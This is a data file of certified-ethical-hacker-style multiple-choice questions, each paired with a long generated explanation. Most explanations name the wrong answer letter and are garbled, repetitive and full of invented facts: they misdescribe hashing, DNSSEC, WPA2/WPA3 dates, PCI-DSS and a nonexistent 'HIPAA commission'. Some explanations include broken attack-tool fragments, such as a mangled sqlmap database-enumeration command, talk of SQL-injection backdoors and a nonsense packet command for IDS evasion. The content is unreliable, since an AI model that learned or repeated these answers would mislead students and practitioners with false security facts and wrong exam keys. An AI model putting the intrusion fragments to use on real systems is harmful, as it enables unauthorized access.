1,"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may
be logged on several files located in /var/log. Which file does NOT belongs to the list:
A.  user.log
B.  auth.fesg
C.  wtmp
D.  btmp
","
the correct answer is b. most linux distributions will provide a login service. this is the file you log in to. if a user log in to the system, which file would be related to the login attempt? the five files listed here belong to the linux system log system. /var/log is just a convention and does not represent a logical path. user.log is not a file. the following are five files : /dev/log /home/log /mail/log /log.log which of the following would be a useful file? the process log ( /dev/log ) is a common design notation on linux for application logging. as applications are released, they may log to this file. the process log ( /home/log ) is a common idea among operating systems, and any logging system on linux will land in that file. mail.log ( /dev/log ) would be a useful log file because it provides a log path specific to mail. the mail.log file would be useful because it provides a log path specific to mail. the process log ( /home/log ) is probably useful because it would highlight processing operations on a linux system. it may include things like a message being sent, which would be displayed in case logic showed the file was not written to or closed to that message. the process log would also display a lot of information from the operating system, such as time, date, time of the log, and origin of the log. while the mail.log file would be useful, it may"

the correct answer is b. the program a, in its entirety, is a tool that uses a range of sql injection methods to discover databases being used on the target. assuming the form is using ssh, the following command is used to connect : sqlmap.py-u,, & forumaction=search '' -dbs a. creating backdoors using sql injection using the previous connection command, you ’ ll see this line in the output : a brute-force method was used to guess databases. just what a surprise this is, but let ’ s wait to see the actual news has been found? there is a solution to this past-geek news : don ’ t describe yourself as a “ web designer ” and “ blog administrator. ” because you ’ ve been identified as a “ spy ” and “ spy computer. ” sufgeated as that may be, you ’ ve still had a good time discovering new methods to discover databases using sql map. a final note on how you might use sql map by using your local gobillioner attack team : don ’ t describe yourself as a “ web designer ” and “ blog administrator. ” because you ’ ve been identified as a “ spy ” and “ spy computer. ” sufgeated as that may be, you ’ ve still had a good time discovering new methods to discover databases using sql map. a final note on how you might use sql map by using your local gobillioner attack team : don ’ t describe yourself as"
3,"Sam, a web developer, was instructed to incorporate a hybrid encryption software program into a web
application to secure email messages. Sam used an encryption software, which is a free implementation of the
OpenPGP standard that uses both symmetric-key cryptography and asymmetric-key cryptography for
improved speed and secure key exchange. What is the encryption software employed by Sam for securing the
email messages?
A.  PGP
B.  S/MIME
C.  SMTP
D.  GPG
","
the correct answer is d. email encryption tools like soa.io, pgp.io, and pgp.harvest.com allow you to encrypt email messages you send within your organization using pgp or other secure mail encryption protocols. the underlying mechanism might be an smtp server, which is normally encrypted by default. this means that even if the mail server ( or the operator of the mailing list ) was to be compromised, it wouldn ’ t be of any use to attackers. how does this compare to using a synchronization protocol like snmp? snmp is a communication protocol used primarily within windows networks to provide for the synchronization of active directory data structures. what this means is that you could use for example, snmprecord.com to sync up with the active directory servers in your organization and then attempt to spoof any hostname or ip address. the idea here is that if the server synchronization doesn ’ t work exactly as expected, you could assume it ’ s compromised. snmp doesn ’ t provide a means to encrypt mail messages ; however, when it comes to smtp over tls, it makes the most sense. one last note on snmp and pgp is that if you are using a synchronization protocol to attempt to fool someone into thinking your address is legitimate, you could potentially use a fake ip address or a swap attack, where the attacker switches your address to look elsewhere. however much you know pgp is better than snmp when it comes to encrypting mail messages. pgp provides for a free"
4,"Which of the following is assured by the use of a hash?
A.  Authentication
B.  Confidentiality
C.  Availability
D.  Integrity
","
the correct answer is b. assumption, anecdotal evidence, and proof from a third-party source are all terms that come from information security. a hash is a value that generates another hash. unlike a key, which is unique and protects a single data structure, a hash protects against loss or corruption of that data. put differently, the hash of a book contains no relation to the book itself after it has been edited, manipulated, or corrupted. a hash is a great way to authenticate a message because every data structure is unique and can ’ t be replicated. for example, if you were to see the hexadecimal number 0x401 is a port number, you would know nothing about water pollution in america. after the hash is generated, it ’ s distributed everywhere and used for authentication. two different sources generating the same hash from the same data should cause suspicion on the part of the attacker. the last step in this process is to extract the information from the hash because it will be distributed everywhere already. extracting that information and sending it to someone should cause suspicion on their end. just remembering this step will help you throughout your life ; in fact, it ’ s a good start to remembering security in general. a hash is a wonderful authentication tool because it ’ s dependent on the data structure it ’ s analyzing ; it ’ s not its own master key. in other words, a hash is not a key. a key is a unique piece of data that locks a data structure together. a hash"
5,"What is not a PCI compliance recommendation?
A.  Use a firewall between the public network and the payment card data.
B.  Use encryption to protect all transmission of card holder data over any public network.
C.  Rotate employees handling credit card transactions on a yearly basis to different departments.
D.  Limit access to card holder data to as few individuals as possible.
","
the correct answer is d. while it is generally considered to be one aspect of rfid, credit card theft and fraud are much higher up the scale than roaming. it would be like trying to find the lowest price on apples or oranges and then asking how much you should be paying for apples and oranges. you simply can ’ t compare the two. having said that, card holder data (pchd ) is important to a smooth running business. recommendations for maintaining pchd are to keep it to within 0.35 to 0.50 percent of the total value of credit card sales each year, to make it convenient and efficient for the customer, while maintaining a level cash flow for the business. it should also be noted that pci compliance does not ensure that cards will not be stolen or that it will reduce fraud. instead, it is simply trying to protect any data associated with the card. one last note on pci compliance — unless you ’ re talking to a member of the microsoft security team, you ’ ll see some interesting details regarding your credit card data transmits to them. you might have reasons for using a public exchange card tracking system, but you ’ re exposing yourself to potential security breaches using it. a private one is better. next step is to apply security fixes to the encoding algorithms so that they don ’ t allow plain text transmission. in short, be careful about how you handle pchd. it could be your one last chance to avoid cashing out. a"
6,"What is the proper response for a NULL scan if the port is closed?
A.  SYN
B.  ACK
C.  FIN
D.  PSH
E.  RST
F.  No response
","
the correct answer is e. a null scan makes sense if you aren ’ t already aware of what null scanning is all about. a null scan sends messages to all ports, expecting only a null response. not only does the machine not respond, it doesn ’ t even sense the request in the first place. if the port is open, you ’ ll get a syn message back ; when the port is closed, you ’ ll get an ack message back. from there, things get a little confusing. the response to a syn request should be a syn/ack message. if the port is open, you ’ ll get a syn/ack/no response. huh. a syn/ack message may also be returned if the port is closed. only instead of a syn/ack, you ’ d get a rst message. finally, the correct response to a null scan is no response. it ’ s possible the port is closed or unreach-able, but it ’ s not the response to a syn scan. it should ’ s be noted that just because a port is closed doesn ’ t mean that a port should not be opened. some reasons why a port may be opened include insuring that a lesson passes easily or, oh, allowing connection requests from anywhere. a null scan just tries to see if the lesson will connect easily. it ’ s not intended to do any connection testing. if a lesson is closed, the syn scan may connect easily. a lot of people think a null"
7,"What kind of detection techniques is being used in antivirus software that identifies malware by collecting data
from multiple protected systems and instead of analyzing files locally it?s made on the provider?s
environment?
A.  Behavioral based
B.  Heuristics based
C.  Honeypot based
D.  Cloud based
","
the correct answer is b. antivirus solutions have been able to identify malware for decades now. though practice has evolved some, mostly in the way antivirus solutions have had to adapt to detecting viruses and later, called files, that may have been previously unknown or no longer available ( because of the attack ). the only reason this comes to our attention, in part, is because of the number of files that were found there compared with all the others. behavioral based antivirus is looking at the behavior of the executable to determine what they ’ re doing. this kind of analysis can identify things like the size of the program overrun on a executable, how many statement executions were done, how many times the program tried to write to disk, and so on. heuristics based antivirus is looking at the nature of the provider, what kind of hashing algorithms are used, how the provider has been known to push out malicious software, and so on. a honeypot is a tool that is set up in an effort to attract attack crews, hook up to a network, and pretend to be something it isn ’ t. the idea is that when the attacker does what they ’ re doing, they ’ ll leave behind enough information to identify themselves. the honeypot is therefore a type of attack that attracts the attacker, providing a target for their efforts. the cloud is an implementation of software as a service where the hardware and software are hosted in the cloud provider ’ s infrastructure. because of the number of files"
8,"Which type of security feature stops vehicles from crashing through the doors of a building?
A.  Bollards
B.  Receptionist
C.  Mantrap
D.  Turnstile
","
the correct answer is b. while receptionists are used everywhere—airport, by the way—as important as they are and are key employees, receptionists in a building don ’ t in and of themselves cause a vehicle to crash through the doors. they may be used to help prevent a vehicle crashing through the door, but it ’ s not the reason why the gate is swinging open. the reason why the gate is swinging open is to allow vehicles to flow in and out of the parking lot. just as an note outside the scope of this question, receptionists are employed in a variety of ways and are used in a variety of locations. some receptionists are employed to handle everything from checking IDs and allowing vehicle access to a parking lot to standing guard outside a building. it ’ s also not just the receptionist—it may be for some that the door switch itself is controlling the gate, but that ’ s not right either. a man trap is used to restrict entry to a room or building by a man alone. a turnstile, though, is used to allow vehicle flow but will allow only one direction—usually allowing people to flow in but not out. it ’ s fast and secure, holds the door while turning a key, and allows vehicles to flow in and out of a building. not only does the turnstile allow people to flow in and out of the building, but it will also allow cars into a parking lot as well. one last note on man traps and turnst"
9,"A large mobile telephony and data network operator has a data center that houses network elements. These are
essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and
IPS systems.
What is the best security policy concerning this setup?
A.  Network elements must be hardened with user ids and strong passwords. Regular security tests and audits should be performed.
B.  As long as the physical access to the network elements is restricted, there is no need for additional measures.
C.  There is no need for specific security measures on the network elements as long as firewalls and IPSsystems exist.
D.  The operator knows that attacks and down time are inevitable and should have a backup site.
","
the correct answer is d. most questions on the exam will be based on factors like this, so do a lot of reading and learning about security on your exam. the physical access question is unrelated to this topic. as for the other two, sure, hardening external access to equipment and ensuring security before deploying the equipment is a good idea, and the physical protection of the equipment should help protect against unauthorized access. the question is whether there ‘s any use making the same secure equipment double or triple secured outside the organization. no sense at all there. just a horrible idea. the point is securing the inside of the network and security during deployment is much more important than securing the outside. scanning and enumeration should help in identifying available secure hospitals and networks before you decide which equipment to use. this step will avoid a lot of trouble a common sense approach to security could get into. finally, hardening all external accesses to the network should help there as well. for a final aside, remember that the idea of a successful attack or challenge is sometimes described as gaining or maintaining access to a targeted resource—or to use security as such. having no use for the target at all should help with that. in other words, whether it ’ s external access to a system, a route to networking subsistence food, or a a couple of seats at a particular game, security access from the outside should not change much. the less it changes, the better off you are. lastly, a question like this"
10,"Which regulation defines security and privacy controls for Federal information systems and organizations?
A.  HIPAA
B.  EU Safe Harbor
C.  PCI-DSS
D.  NIST-800-53
","
the correct answer is b. the europeans safe harbor regulation defines how to handle data security and privacy in the european union. the regulation is named psa ( privacy and security act ) and was developed after other standards protect more of our lives and businesses more of the time. the psa requires businesses to register with the e.gip and monitor and protect data held in or transferred between e.g. entities. the regulation is named psa by the great security watchdog, the european commission, and describes how to protect data within and transferred between enterprises. the regulation is named psa by the huyness of security watchdog, which doesn ’ t know what security and privacy actually mean. the only thing you know about security and privacy to this point is that they ’ re confusing you about information security and exposing your secrets. the psa regulation defines how to deal with information systems owned by a client, meaning that even if you were to give them free software, they would be liable for its security and protection. the regulation defines how to associate laws with laws, how to present information regarding legal aspects of a dispute to the clients, how to implement law and law-related procedures to respond to a dispute, and how to resolve the dispute as best possible. the psa regulation is named psa by the great security watchdog, but most people else call it the hipaa regulation. hipaa defines how to protect information in federal systems and organizations, and it was implemented in 2002 as a response to"
11,"is a set of extensions to DNS that provide the origin authentication of DNS data to DNS clients (resolvers) so
as to reduce the threat of DNS poisoning, spoofing, and similar types of attacks.
A.  DNSSEC
B.  Resource records
C.  Resource transfer
D.  Zone transfer
","
the correct answer is b. dns poisoning and related attacks are common and relatively easy to pull off. a dns poisoning attack looks simply this : the attacker sends a false response to dns that points to a valid ip for a domain the client belongs to. because dns clients ( resolvers ) will always attempt to connect to the ip provided by dns rather than their own, which is what would occur if things worked the way they should. to pull this off, you just need to get your dns client to connect to the fake ip provided by your attacker. similarly, similar host records could be used to redirect to other ip addresses. because dns uses udp for transmission, this attack is easy to conceal. dnssec is a proposal to use dns to push information ( resources, files, or other data ) to a designated recipient. to accomplish this, an authority ( usually a server ) makes efforts to mark records for the designated domain ( url ) so that any device requesting an address can get the necessary information. this is done using rsds, which can be transmitted over dns. if a device wants or needs a resource, it queries dns for the rsds and then obtains the required information. this process protects the consumer ( device ) from misrouting or spoofing attacks on dns servers. bsd, microsoft, or linux still uses dns substantially the same way it has since the 1980s. dns requests from a client like a router or a linux machine simply ask dns for the information it needs and"

Which of the following class of hacker refers to an individual who works both offensively and defensively at
various times?
A.  White Hat
B.  Suicide Hacker
C.  Gray Hat
D.  Black Hat
","
the correct answer is d. i ’ m convinced there are somewehere some people who think there are no differences between black, gray, and gray hat when it comes to hackers, but for purpose of this question, we ’ re going to stick with the way they know well. a black hat is a hacker who works solely to exploit weaknesses in the system, for example, attack and exploit developers. a gray hat is a hacker who works either way—good or bad. the difference between gray and black is that gray hat is any kind of hacker who works with good reason and for good cause. example : an attacker during the day who is trying to exploit weaknesses in the system for revenue. a black hat is a hacker who does bad things for bad reason and without good purpose. example : an attacker who does bad in order to get good. both examples are illegal, no matter what you call yourself. a white hat is a hacker who works for the betterment of the society and the computer world by providing security improvements to systems and organizations. they do this either by working for the internal staff or by working for organizations directly. another type of white hat is a hacker who works for a company in order to raise awareness about problems with the system. all of these are white hats because they are working for good cause and for the good of the computer world. the final type is the hacker who works for the good of the hacker, who is guilty of blackmailing and extortion. called blackmail"
13,"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets
to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be
used to perform session splicing attacks?
A.  tcpsplice
B.  Burp
C.  Hydra
D.  Whisker
","
the correct answer is c. ids evasion tools include wappalyzer, htttracker, and url status meter. all of them will show you an open port and possibly even identify you traffic as a target. for example, if your machine is on msn groups, url status meter will show you a closed 443 protocol port. on a linux machine, the following command will show you all open ports and one of them is usually a session splicing tool. in this example, hi has been running a snort script for pasted traffic, and hbo is the tool that shows you open ports. remember, session splicing uses small, sized packets to fool an ids, so sending large, robust packets may hide the attack. for example, the following command sends large, robust packets to pass through : sendpreamble admin=opinion=interest=1 1500<=seq<2000 – seq 2462402190 1492 0 0 141599802. just try sending pasted large packets to your target and watch what happens. you can use toolchatter, but once you know session splicing, you ’ ll understand it better. as an aside, pasting packets full of! and & doesn ’ t really make much sense, so avoid it. for the real world, session splicing is usually of little value in the real world, and you ’ ll probably find it a gimmick, but the ideas behind it are decent. remember,"
14,"An incident investigator asks to receive a copy of the event logs from all firewalls, proxy servers, and
Intrusion Detection Systems (IDS) on the network of an organization that has experienced a possible breach of
security. When the investigator attempts to correlate the information in all of the logs, the sequence of many of
the logged events do not match up.
What is the most likely cause?
A.  The network devices are not all synchronized.
B.  Proper chain of custody was not observed while collecting the logs.
C.  The attacker altered or erased events from the logs.
D.  The security breach was a false positive.
","
the correct answer is b. when it comes to collecting logs, there are a number of ways to go about it. first and probably most obvious is to observe convention. most logs will provide a means to copy log files to an external location, device, or application. many organizations now provide a schedule for the rotation, maintenance, and synchronization of logs. replacing ancient usb sticks, cds, tapes, and pendrive subscriptions in the clear can help in identifying where the real problem may be. the technique referred to as correlation is taking the logs from different sources and comparing them. a common way to do this is to combine the logs from ids systems in one log file. it ’ s fairly common to see an effort investigator receiving a copy of all logs from all ids systems in one combined log file. another way is to synchronize the ids systems and have the investigator access a single source. lastly, a complete correlation exercise involves coordinating efforts between different log file holders ( systems, applications, and humans ). if any of those elements is not trained, diligent, and organized in the correlation process, it ’ s likely the log owner will fall short of the goal line. another note on correlation is that so so much can be done in a computer with a log correlation tool ( like warden ) that you might want to ignore it manually for this task. all i can say here is that most cor- relation tools don ’ t cost a dollar and can be a valuable addition to security during"
15,"A zone file consists of which of the following Resource Records (RRs)?
A.  DNS, NS, AXFR, and MX records
B.  DNS, NS, PTR, and MX records
C.  SOA, NS, AXFR, and MX records
D.  SOA, NS, A, and MX records
","
the correct answer is b. a zone file consists of only dns records. there are no other records that are created in this file. the dns server will examine only those resource records located in the same record that contains the hostname that is addressed. if the hostname is named, the resources listed within that record will be searched as well. for example, the following dns record response would be sent to the server identified by the mx record : brian-mcmanus-dnsserver.com. mx response brian-mcmanus-dnsserver.com. and if the hostname was located in the same record as the ip address, the response would be referred to as a ptr record : : : the hostname : : : address pair brian-mcmanus-dnsserver.com. : : 68.99.50.78 in this example : response soa record the following is a summary of dns record types : soa this record defines the address of the server that is responsible for responding to ip addresses asking for information in that zone. ns this record identifies one or more nameservers within the target zone. a, axfr, and mx these records are used to provide a channel to a client that is intending to look at records in that zone. ptr this record maps an ip address to a hostname that is typically providing an ip address response. watch that the absence of a ptr record does not imply that a zone does not exist : for example, the google web server may be offering"

the correct answer is d. are you ready for this question? ec-council has multiple wireless security protocol questions on the exam, and answering them correctly will be a key to doing well. wpa2 was released in 2001 as an enterprise-level wireless security protocol alternative to wep. where the wep protocol used fcs ( file control protocol ) to exchange information about broadcasts and how to calculate clock times, wpa2 used ecp ( elliptic curve privacy ) and shifted the maximum security level to 192 bits. additionally, because of improvements in wireless technology at the time, use of broadcast behavior was stopped. also, because of better media protection measures at the network layer, broadcasters couldn ’ t broadcast freely anymore on 6.00m or 52.50fh. wpa3, coming out in 2009, replaced wpa2 and improved upon it in many ways. main differences from what you see provided by dd-dns and other sources are as follows : wpa2 used mmac-sha384 and ecdsa using a 384-bit elliptic curve. wpa3 used secp-224 and nsa-204 and created a smaller size file ( 384 bits ) for encryption and protection from broadcast. additionally, one of the last issues with broadcast behavior under wpa2 was resolved in wpa3. wpa2 entered enterprise space in the 1990s and was a good step forward in terms of security and wireless networking."

the correct answer is b. the first and obvious one to mention here is the body of the question : “ what tests would you perform to determine whether a computer has been infected? ” almost without exception, answers to this question will involve some in-depth examination of technology, software, and even antivirus programs. you ’ ll probably see two to four answers here, depending on many factors. the second question involves the story of a friend you know who actually sends a harmless file to a friend. do some checking yourself on what you know about technology and see if you can find a reason to believe him told the truth. almost without exception on the exam, that story will be based in reality. netstat -a command line tool for checking the operating system paths of a computer : the netstat command in windows is one way to look at traffic on a local network. -a switch gives you a full look at all the paths the tool knows about. this command is equivalent to netstat -b which gives you an address grid on the local network and connects to listening ports on it. one final note on netstat : you will not really get a true look at technology on this question ; instead, what you ’ re really looking for is how much faith you can place in the answer best representing your knowledge and experience. assuming that ’ s clear, the rest of what you know about the computer and its owner will probably be useful in determining the answer. there are other ways to check for and test"
20,"Which type of sniffing technique is generally referred as MiTM attack?
A.  Password Sniffing
B.  ARP Poisoning
C.  Mac Flooding
D.  DHCP Sniffing
","
the correct answer is b. mitm ( mirror image of a network ) attacks can be used as a denial-of-service attack, poisoning arp poisons so stations will respond to unknown arp responses from your machine. mac flooding is another arp poisoning technique. dhcp sniffing is a slightly different technique. a tool that does dhcp sniffing is nmap, since it supports the -sn flag for snarfing dhcp packets. another tool that can do it is hping, since it has both -sn and -p flags. a mitm attack is generally referred to as ping cross-ing ( sometimes written as ping cross-guests ). another technique is session hijacking, which means hijacking a session between two systems. the session could be a tcp session or a session between udp. arp poisoning is another tcp-related technique. a packet can obviously contain information about connections to other hosts. since tcp uses port 0 for background or “ unknown ” data, giving you an arp poem like this would work well. another option is session hijacking, but sessions can include more than just arp information. an arp poem could possibly come from an attacker trying to gain a session on a target system. another one is session hijacking and session spying, which basically mean the same thing. one last one on your exam is session hijacking and session spying not going via arp poems, except maybe in the confusion of a memory attack. a memory attack is apparently crazy enough to pull off, so any attack like"

A.  Quid pro quo
B.  Diversion theft
C.  Elicitation

","
the correct answer is b. almost without exception, social engineering has a “ tell ” tool to pull off the success bar. whether it ’ s a smile, a grin, a happy smile, a happy grin, a little bit of information, or a whole lot of information, the tell is a smile or a happy smile that tells you something isn ’ t right in your path. social engineering relies on the truthfulness of false information, which normally falls into one of the following categories : phishing, smishing, and appstore cheating. phishing is basically pretending to be something you aren ’ t, whether on email, through a messenger, or using some other delivery method. smishing is using your smartphone to pretend to be something you aren ’ t—typically a server or other information technology resource. appstore cheating is pretending to be a useful application you shouldn ’ t have because one exists or is added to a program. stealing through phishing is known as the diversion theft attack because phishing can open a back channel for fraud and frauds to sit and wait in. an attacker there can monitor user communications and identify vulnerable systems. social engineering attacks usually fall in one of two categories : identity theft and spearpoint hacking. identity theft attacks usually fall in two categories : online identity theft and shoulder surfing. online identity theft uses phishing and some form of social engineering to gain login information, credit card information, or other sensitive data. shoulder surfing does nothing real-world equivalent to, but instead surveys the shoulders"

the correct answer is b. one of the reasons there are concerns regarding the security of the wireless network is because so many basic security concepts are missing out in the arena of wireless security. from the network layer up, there are several gaps where security should be provided, but aren ’ t. at wireless level, we ’ re still discussing the network layer. so, the wireless network should be protected by the same security flaws as the wired network. the difference is most wired networks are protected by a firewall. in the wireless realm, the radio chain protection should protect you just as well. so, looking at the specs for the radius, we see the following is addressed by the ssid : phd = 802.1a, radio header = 0.0.0.0, phc = 0.1.0.0, channel = 6, awa = 0, awr = 0, howtar = 0, pbc = 11. the radio header contains some useful pieces of information. dsn is the destination secret, which determines the key that is used to encrypt data transmissions. it is derived once per station and used to encrypt data transmission. the serial number determines the product of the key. the code gives the value. the code is phd, which determines the radio header features. the features are phc, which determines the radio chain protocol in use. the radio chain protocol determines how the radio headers are created. the radio header"

the correct answer is b. after a few steps and some research, you ’ ll be able to identify the netbios version used. netbios ( nb ) is a networking protocol that was initially designed to replace the net and appernet in the early ’ 80s. netbios protocol version ( nbpv ) indicates the version in use and the number of stand-alone and network sessions that are running. for example, version 1 sends only over port 139, just as mentioned. however, version 2 also sends over 515 and 536 in addition. the codes shown demonstrate whether a connection was open and who had sent the code. for example, 3 indicates the “ wait ” code. therefore, waiting for the machine to connect and connect successfully before doing the rest of the enumeration. other codes to watch for are 20, which indicates that the messenger service ( a highly integrated application commonly used with nb ) is running. another version, 00, indicates that the netbios server, which is normally placed in the local area, is open. in addition to enumeration itself and answers to some netbios questions, you will see one question like this on the exam : what netbios version was used in connecting to the messenger service? a. 3 b. 2 c. 6 d. 5 e. 4 f. 1 g. 6 h. 3 i. 2 j. 5 k. 4 l. 6 m"

C.  You load a dictionary of words into your cracking program
D.  You create hashes of a large number of words and compare it with the encrypted passwords
E.  You wait until the password expires
","
the correct answer is d. as defined in the nist special publication 800 series, a brute force attack “ involves attempting every possible combination of passwords and decrypting the combinations repeatedly. ” basically, you take every possible password and see if it will decrypt to a valid password. loading a dictionary of words into your cracking program doesn ’ t solve anything because you still won ’ t know what password you ’ re looking for until you see what each of the words decrypt to. waiting until the password expires is irrelevant and is not considered brute force in this context. you could potentially use a rubber hose to force someone to reveal their password to extract it in a brute force attack. however, the rubber hose won ’ t protect you against a password expiring due to a user mistake ( inserting a “ secret key ” ). a brute force attack isn ’ t used as a way to extract passwords ; it ’ s used to attempt every possible password combination. there is still expiring or some other action necessary before the password will be exposed. a rubber hose is not a crime. throwing a rubber hose at someone and asking them to reveal their password is extortion. it ’ s not a brute force attack in the sense that you are trying every possible password ; however, you are loading a dictionary of words into your cracking program to force someone to expose their password because a brute force attack involves attempting every possible password combination. a rubber hose is not a crime, and throwing a rubber hose at someone and asking them"

the correct answer is a. if you know economics and business cycles, you know what this is. yancey is offering himself, his services, and his knowledge for free, which is called a black hat attack. he is trying to bring down the company, which is his second hat. in essence, he is trying to make his current company ( earth ) the head of state of some other planet, and he ’ ll do what needs to be done to get that done. if you know none of these things, this may seem a little confusing, but it ’ s great news because you don ’ t have to know all the pieces but you do need to know what they ’ re going to be used for. step one was identifying a habit of yours ( the downsizing of the company ). step two was using your own nature to bring down the company—setting up logic bombs for yourself. in this same vein, you can figure out why someone is making sacrifices for his organization. he is probably trying to bring in a portion of the network to his own company. he may be trying to bring in departments, groups, or individuals ( source lists ) for a purpose. he may also be trying to bring in information ( data, logs, or sensitive images ) for a purpose. if you know the terms of reference ( tor ) rules for each entity, this can be a simple way to bring them down. in conclusion, if you know a hacker is trying to bring down something"

A.  Host OS on containers has a larger surface attack.
B.  Containers may full fill disk space of the host.
C.  A compromise container may cause a CPU starvation of the host.
D.  Containers are attached to the same virtual network.
","
the correct answer is d. this one is a blast from the book ’ s library, and it ’ s true—containers may actually be more secure than virtual machines. the assertion is related to a study showing containers may be more secure than virtual machines. the study, published in september 2016, found not only were containers less likely to be compromised than virtual machines, but the average container was more secure than the average virtual machine. the discovery may be relative to a study in 2014 showing virtual machines were more likely to be compromised than containers, but that ’ s not to say containers are better secured than vm ’ s. what ’ s more, while the notion of “ more secure ” is subjective, to the researchers involved, that same term was defined as a container that was fully funded, implemented, and operated by a business. all factors except this one were correlated with more secure. so, how does this all translate to more secure? well, to be fair ( and a funny way to be fair in this series is becoming accustomed ), it has nothing to do with questions like that. what the study did find was that containers were, on average, less expensive to run and more efficient than virtual machines. containers are generally less expensive to run because of a lack of infrastructure, processing, and other overhead. they are also more efficient because of how the host systems mount the containers—just like virtual machines but with a renewed way to stick a piece of hardware directly into the"

communication technology George employed in the above scenario?
A.  MQTT
B.  LPWAN
C.  Zigbee
D.  NB-IoT
","
the correct answer is b. mqtt is a protocol used for a reliable, persistent channel to communicate with an embedded device. the device can be an ip device or even a radio device that is using short-range communication. the signal range is typically 0-100 m ( 0-300 ft ) for a standard bluetooth device. mqtt uses a server that is vulnerable to client attack. the server can ’ t guarantee reliability, and messages may not be delivered. messages are parsed once per second or less. mqtt does not use anything close to a range. the range of communication is much longer, at 650 m ( 2,000 ft ) for a standard bluetooth device. messages are parsed on a quarterly basis and require the server to check if new messages are available. also, messages are not reliably delivered on mqtt, but it does use a longer detection interval than bluetooth. the three other options are not wireless technologies. nb-iot is a new iot platform that is based on the idea of an attacker-free world. devices use a server that verifies things done to them and checks if anything might be hacked. the server can ’ t guarantee reliability, and messages are sent on a quarterly basis. mqtt uses anything from one to hundreds of packets to communicate a message, depending on the needs of the client. nb-iot uses up to 80 bytes for a single packet and 1,000 bytes for a complete message. bluetooth uses around 0.3 km ( 0.18"

B.  is-d abccorp.local
C.  Iserver 192.168.10.2-t all

the correct answer is b. the program nslookup is used to look up names on a dns server. you use the command type=all to tell dns that you want to look at all records in that zone, and you would not need to use type=all if you knew the name server entries for the domain. the remaining answers don ’ t exist. a zone transfer is the process of renaming records held in the local copy of the dns name server to names that make more sense in other servers. naming services on a router are typically resolved using a zone file, and the hostname used to resolve an ip address would usually be the hostname of the server providing the specified ip address. attacking a client-machine domain looks at the nameservers for the domain and looks at all the nameservers in the cache. if the cache is small, it ’ s likely relatively short. a longer cache time means more takes on roles of many things, but the exact nature of the names the cache remembers varies from one cache owner to the next. a host name is not a requirement for passing the zone transfer, but if the cache knows no other name record holders for the domain and has no information on the host, it will return a 450 error. usually a cache owner would verify the zone transfer request with a put command and not a query one. a host name look at can not be performed with the dns lookup program type=all type=lookup = none of the answers here can be performed. a zone transfer"

A.  The switches will drop into hub mode if the ARP cache is successfully flooded.
B.  If the ARP cache is flooded, the switches will drop into pix mode making it less susceptible to attacks.
C.  Depending on the switch manufacturer, the device will either delete every entry in its ARP cache or reroute packets to the nearest switch.
D.  The switches will route all traffic to the broadcast address created collisions.
","
the correct answer is c. when a cache hit occurs, the source address is placed into the cache. if the cache is hit, the system will look at all the entries in the arp cache to find the corresponding port. if that port is a broadcast address, it will resolve to the default internet cache cache, which will resolve to a pix mode device. if the cache cache is successfully flooded, the system will resolve to the destination, which will be a broadcast address, and the destination cache will be assigned to the pix mode device, which means it will route all traffic to that address. if the arp cache is not successfully flooded, the system will route everything to the broadcast address, which isn ’ t a nice thing to have when traffic is being attempted cross the room. the second is dependent on a lot of things—how the switches are configured, how the os is configured, and how the traffic is sent. as a general rule, if arp cache is successfully flooded, the systems will route everything to the broadcast address, which is great for sniffing traffic. if it ’ s not successfully flooded, that means the cache cache will route everything to something called null arp, which isn ’ t really anything. null arp does not mean no arp, which might lead you to think that would be good news, but it ’ s not really a solution at all. it relates to a technical aspect called arp spoofing, which is very difficult to counter. the last two answers really go hand"

as its fragment identification numbers?
A.  Decoy scanning
B.  Packet fragmentation scanning
C.  Spoof source address scanning
D.  Idle scanning
","
the correct answer is c. a zombie is a system that is monitored or controlled by an attacker. a fragmenting firewall, when it comes to network architecture, uses port numbers and application protocol names to make sure that traffic can get to the intended recipient. this means that if a fragmenting firewall sees these ports and application protocol names, it will ignore them and not allow the traffic through. the other two are unrelated to networking. decoy scanning doesn ’ t exist. a packet containing a spoof source address will likely be allowed by a firewall because it looks like a legitimate source. the fragment identification number is not a reason to scan ; it ’ s a number that fragmenting firewall rules tell a firewall what ports to listen on. it has nothing to do with source or destination ports. idle scanning does not exist. even if it did, which scenario is being exploited? if you are going to spoof source address and port for that attack, you probably want to make sure no one knows the frequency or reason to the scanning. a zombie is just another term for a compromised system. a zombie system might well have low network activity, and the fragment identification number might be a reason to watch. however, if it ’ s port activity and source address activity are demonstrating a zombie system, then where the source address is going might be important. the victim could be telling someone an important piece of information. if the victim is expecting a reply but the email is going to a zombie address, that might be even"

the correct answer is d. if the user doesn ’ t know what a trap and trace function is, they may be inclined to check the registry for possible rootkit signatures. not everyone will have a tool like kttrace installed, but if they do, they should be able to trace the network traffic to find the attacker ’ s current location. a tool like rttrack can also help in this situation. in the case of a disk copy operation, the idea is the same : the user copies files from the target machine to a known-good location and then analyzes the traffic. the next step is to copy files from a known-good place to a suspect location. both the target and suspect files are the evidence we ’ re looking for here. if the source is known good, then copying the files from the source machine to a suspicious location is the best way to discover the presence of a trojan. analyzing the files as they move across networks will provide the information we need. by the way, the idea behind tracing files and networks to find the source of an infection like a trojan is great theory but is difficult in practice. be careful and enjoy your peace until the attacker returns with more files to copy. you ’ ll need to watch that dodgy file could be a way out of the mess. good writing, proofreading, and coding are the keys to this kind of analysis. creating well-known-good directories and files as starting points will help a lot. this assumes the same standards are used"

the correct answer is b. July 2002 was the effective date for the public company interval disclosure standard ( pcidss ). previously, companies could rely on annual disclosures to stockholders on the importance of monitoring financial statements and how to evaluate and verify performance. pcidss, however, required companies to disclose all public filings, including third-party services. this left many doubts about the accuracy of accounting reports and some companies simply didn ’ t want their filings disclosed. therefore, accounting firms were hired to “ clean up ” the filings and filings were released, no matter how untrue or fraudulent. this continued until the effective date. on that day, all filings were required to be put together and available for inspection by anyone. the idea was to increase accountability and ensure fairness in reporting. although some of the laws putting this into effect were controversial, the federal commission on financial management of corporations ( known as the hipaa commission ) was concerned about fraud and made certain provisions in the laws to protect shareholders and investors from fraud. one of the key findings was that many companies simply didn ’ t have the wisdom to recognize and respond to hipaa requirements. according to the hipaa commission, any breach of confidentiality, privacy, or security on the part of the organization in control of the data was considered fraudulent, and any organization that caused such a breach might be considered liable. the hope was that combining confidentiality, privacy, and security would improve fraud. however, it should be noted that most companies simply didn ’"

